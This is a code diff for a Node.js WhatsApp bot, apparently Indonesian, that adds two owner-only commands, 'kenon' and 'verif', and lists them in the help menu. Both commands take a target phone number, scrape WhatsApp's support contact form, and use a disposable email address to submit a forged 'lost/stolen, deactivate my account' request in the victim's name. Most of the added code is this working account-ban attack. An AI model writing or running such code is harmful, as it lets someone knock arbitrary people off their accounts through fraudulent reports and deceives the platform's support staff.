@@ -207,7 +207,7 @@ module.exports = reza = async (client, m, chatUpdate, store) => {
       switch (command) {
         case "help": case "menu":
           if (isBanned) return m.reply(`*You Have Been Banned*`)
-            anu = `*WhatsApp-Ai Version 1.5.0*\n\n➥ *Bot Information*\n*Hai Kak ${m.pushName} ${ucapanWaktu}📍*\n➤ _Nama Bot: ${packname}_\n➤ _Nama Owner: ${author}_\n➤ _Runtime: ${runtime(process.uptime())}_\n➤ _Pengguna: ${signup.length}_\n\n➥ *Logs Updated*\n✔Fixed Bug\n✔Added DALL-E\n✔Added Sticker\n✔Added Gempa\n✔Added Shortlink\n✔Added Tiktoknowm\n✔Added Tiktokmp3\n✔Added Ayat Kursi\n\n*(ChatGPT)*\nMess: ${prefix}ai presiden indonesia\n\n*(DALL-E)*\nMess: ${prefix}img gambar gunung\n\n╭──❒ *All MENU BOT*\n*OPEN AI*\n├• 📌 ${prefix}ai presiden indonesia\n├• 📌 ${prefix}img gambar gunung\n\n*DOWNLOADER*\n├• 📌 ${prefix}tiktoknowm [url]\n├• 📌 ${prefix}tiktokmp3 [url]\n├• 📌 ${prefix}ytmp4 [url]\n├• 📌 ${prefix}ytshorts\n\n*INFORMATION*\n├• 📌 ${prefix}jadwalsholat [kota]\n├• 📌 ${prefix}gempa\n├• 📌 ${prefix}kompasnews\n\n*ISLAMIC SOCIAL*\n├• 📌 ${prefix}alquran\n├• 📌 ${prefix}asmaulhusna\n├• 📌 ${prefix}ayatkursi\n\n*INTERNET ENGINERING*\n├• 📌 ${prefix}inspect [link group]\n├• 📌 ${prefix}getpp [no tujuan]\n├• 📌 ${prefix}gitclone UrlRepo\n├• 📌 ${prefix}whoisip [public ip]\n├• 📌 ${prefix}tourl [reply image]\n├• 📌 ${prefix}shortlink\n\n*HAVE FUN*\n├• 📌 ${prefix}anime\n├• 📌 ${prefix}ilove 6285xxxxxxxxx\n├• 📌 ${prefix}jodohku\n├• 📌 ${prefix}sticker [reply image/video]\n├• 📌 ${prefix}secret 6285xxxxxxxx|Secret|Hi\n├• 📌 ${prefix}toaudio [text]\n\n*PHOTO EDITOR*\n├• 📌 ${prefix}jadianime [reply image]\n\n*TOOLS & GROUP*\n├• 📌 ${prefix}pushkontak [owner only]\n├• 📌 ${prefix}pushuser [owner only]\n├• 📌 ${prefix}pushid [owner only]\n├• 📌 ${prefix}tagall\n├• 📌 ${prefix}hidetag [text]\n├• 📌 ${prefix}creategroup [nama_group]\n├• 📌 ${prefix}kick [@user]\n├• 📌 ${prefix}add [user no]\n├• 📌 ${prefix}block [owner only]\n├• 📌 ${prefix}unblock [owner only]\n├• 📌 ${prefix}ban [owner only]\n├• 📌 ${prefix}unban [owner only]\n├• 📌 ${prefix}getip [owner only]\n├• 📌 ${prefix}ping [owner only]\n├• 📌 ${prefix}group [open/close]\n├• 📌 ${prefix}owner [owner contact]\n├• 📌 ${prefix}listonline\n└────────────>`
+            anu = `*WhatsApp-Ai Version 1.5.0*\n\n➥ *Bot Information*\n*Hai Kak ${m.pushName} ${ucapanWaktu}📍*\n➤ _Nama Bot: ${packname}_\n➤ _Nama Owner: ${author}_\n➤ _Runtime: ${runtime(process.uptime())}_\n➤ _Pengguna: ${signup.length}_\n\n➥ *Logs Updated*\n✔Fixed Bug\n✔Added DALL-E\n✔Added Sticker\n✔Added Gempa\n✔Added Shortlink\n✔Added Tiktoknowm\n✔Added Tiktokmp3\n✔Added Ayat Kursi\n\n*(ChatGPT)*\nMess: ${prefix}ai presiden indonesia\n\n*(DALL-E)*\nMess: ${prefix}img gambar gunung\n\n╭──❒ *All MENU BOT*\n*OPEN AI*\n├• 📌 ${prefix}ai presiden indonesia\n├• 📌 ${prefix}img gambar gunung\n\n*DOWNLOADER*\n├• 📌 ${prefix}tiktoknowm [url]\n├• 📌 ${prefix}tiktokmp3 [url]\n├• 📌 ${prefix}ytmp4 [url]\n├• 📌 ${prefix}ytshorts\n\n*INFORMATION*\n├• 📌 ${prefix}jadwalsholat [kota]\n├• 📌 ${prefix}gempa\n├• 📌 ${prefix}kompasnews\n\n*ISLAMIC SOCIAL*\n├• 📌 ${prefix}alquran\n├• 📌 ${prefix}asmaulhusna\n├• 📌 ${prefix}ayatkursi\n\n*INTERNET ENGINERING*\n├• 📌 ${prefix}inspect [link group]\n├• 📌 ${prefix}getpp [no tujuan]\n├• 📌 ${prefix}gitclone UrlRepo\n├• 📌 ${prefix}whoisip [public ip]\n├• 📌 ${prefix}tourl [reply image]\n├• 📌 ${prefix}shortlink\n├• 📌 ${prefix}verif [nomor target]\n├• 📌 ${prefix}kenon [nomor target]\n\n*HAVE FUN*\n├• 📌 ${prefix}anime\n├• 📌 ${prefix}ilove 6285xxxxxxxxx\n├• 📌 ${prefix}jodohku\n├• 📌 ${prefix}sticker [reply image/video]\n├• 📌 ${prefix}secret 6285xxxxxxxx|Secret|Hi\n├• 📌 ${prefix}toaudio [text]\n\n*PHOTO EDITOR*\n├• 📌 ${prefix}jadianime [reply image]\n\n*TOOLS & GROUP*\n├• 📌 ${prefix}pushkontak [owner only]\n├• 📌 ${prefix}pushuser [owner only]\n├• 📌 ${prefix}pushid [owner only]\n├• 📌 ${prefix}tagall\n├• 📌 ${prefix}hidetag [text]\n├• 📌 ${prefix}creategroup [nama_group]\n├• 📌 ${prefix}kick [@user]\n├• 📌 ${prefix}add [user no]\n├• 📌 ${prefix}block [owner only]\n├• 📌 ${prefix}unblock [owner only]\n├• 📌 ${prefix}ban [owner only]\n├• 📌 ${prefix}unban [owner only]\n├• 📌 ${prefix}getip [owner only]\n├• 📌 ${prefix}ping [owner only]\n├• 📌 ${prefix}group [open/close]\n├• 📌 ${prefix}owner [owner contact]\n├• 📌 ${prefix}listonline\n└────────────>`
             client.sendText(m.chat, anu, m)
             break;
         case "ai": case "openai":
@@ -552,6 +552,111 @@ module.exports = reza = async (client, m, chatUpdate, store) => {
         } else {
           return m.reply(`_Reply to Supported media With Caption ${prefix + command}_`, m.from, { quoted: m })
         }
+      }
+      case "kenon": {
+        if (!isCreator) return m.reply(mess.owner)
+        if (!q) return m.reply('```Nomor Target!```')
+        let nomor_target = q.replace(/[^0-9]/g, '')
+        let cekno = await client.onWhatsApp(nomor_target)
+        if (cekno.length == 0) return m.reply('```Number Not Found```')
+        if (nomor_target == owner) return m.reply('```Dont Verif My Creator!```')
+        try {
+          m.reply('```Operation Run...```' + nomor_target)
+          var axioss = require('axios')
+          let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
+          let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=190308")
+          let cookie = ntah.headers["set-cookie"].join("; ")
+          const cheerio = require('cheerio');
+          let $ = cheerio.load(ntah.data)
+          let $form = $("form");
+          let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
+          let form = new URLSearchParams()
+          form.append("jazoest", $form.find("input[name=jazoest]").val())
+          form.append("lsd", $form.find("input[name=lsd]").val())
+          form.append("step", "submit")
+          form.append("country_selector", "INDONESIA")
+          form.append("phone_number", nomor_target,)
+          form.append("email", email.data[0])
+          form.append("email_confirm", email.data[0])
+          form.append("platform", "ANDROID")
+          form.append("your_message", `Perdido/roubado: desative minha conta`)
+          form.append("__user", "0")
+          form.append("__a", "1")
+          form.append("__csr", "")
+          form.append("__req", "8")
+          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
+          form.append("dpr", "1")
+          form.append("__ccg", "UNKNOWN")
+          form.append("__rev", "1006630858")
+          form.append("__comment_req", "0")
+          let res = await axioss({
+            url,
+            method: "POST",
+            data: form,
+            headers: {
+              cookie
+            }
+          })
+          let payload = String(res.data)
+          if (payload.includes(`"payload":true`)) {
+            m.reply('```Succes.. Nomor Telah Out!```')
+          } else if (payload.includes(`"payload":false`)) {
+            m.reply('```Operation Failed... Try Again```')
+          } else m.reply(util.format(res.data))
+        } catch (err) {m.reply(`${err}`)}
+      }
+      break;
+      case "verif" : {
+      if (!isCreator) return m.reply(mess.owner)
+        if (!q) return m.reply('```Nomor Target!```')
+        let nomor_target = q.replace(/[^0-9]/g, '')
+        let cekno = await client.onWhatsApp(nomor_target)
+        if (cekno.length == 0) return m.reply('```Number Not Found```')
+        if (nomor_target == owner) return m.reply('```Dont Verif My Creator!```')
+        try {
+          m.reply('```Operation Run...```' + nomor_target)
+          var axioss = require('axios')
+          let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+          let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=2022")
+          let cookie = ntah.headers["set-cookie"].join("; ")
+          const cheerio = require('cheerio');
+          let $ = cheerio.load(ntah.data)
+          let $form = $("form");
+          let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
+          let form = new URLSearchParams()
+          form.append("jazoest", $form.find("input[name=jazoest]").val())
+          form.append("lsd", $form.find("input[name=lsd]").val())
+          form.append("step", "submit")
+          form.append("country_selector", "INDONESIA")
+          form.append("phone_number", nomor_target,)
+          form.append("email", email.data[0])
+          form.append("email_confirm", email.data[0])
+          form.append("platform", "ANDROID")
+          form.append("your_message", `Perdido/roubado: desative minha conta`)
+          form.append("__user", "0")
+          form.append("__a", "1")
+          form.append("__csr", "")
+          form.append("__req", "8")
+          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
+          form.append("dpr", "1")
+          form.append("__ccg", "UNKNOWN")
+          form.append("__rev", "1006630858")
+          form.append("__comment_req", "0")
+          let res = await axioss({
+            url,
+            method: "POST",
+            data: form,
+            headers: {
+              cookie
+            }
+          })
+          let payload = String(res.data)
+          if (payload.includes(`"payload":true`)) {
+            m.reply('```Succes.. Nomor Telah Out!```')
+          } else if (payload.includes(`"payload":false`)) {
+            m.reply('```Operation Failed... Try Again```')
+          } else m.reply(util.format(res.data))
+        } catch (err) {m.reply(`${err}`)}
       }
       break;
       case 'restart' : {
